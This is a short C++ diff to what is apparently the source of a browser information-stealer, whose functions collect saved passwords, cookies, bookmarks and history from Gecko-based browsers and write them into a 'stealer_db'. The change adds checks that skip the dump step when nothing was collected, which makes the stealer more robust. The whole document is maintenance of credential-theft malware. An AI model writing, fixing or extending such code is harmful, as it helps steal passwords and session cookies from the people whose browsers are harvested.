@@ -83,6 +83,9 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 		}
 	}
 
+	if (data_list.size() == 0)
+		return false;
+
 	if (!dump_password_data(stealer_db, data_list, data_list.size()))
 		return false;
 
@@ -148,6 +151,9 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 			continue;
 		}
 	}
+
+	if (data_list.size() == 0)
+		return false;
 
 	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
 		return false;
@@ -264,6 +270,9 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 		}
 	}
 
+	if (data_list.size() == 0)
+		return false;
+
 	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
 		return false;
 
@@ -329,6 +338,9 @@ BOOL gecko_history_collector(std::string username, std::string stealer_db)
 			continue;
 		}
 	}
+
+	if (data_list.size() == 0)
+		return false;
 
 	if (!dump_history_data(stealer_db, data_list, data_list.size()))
 		return false;
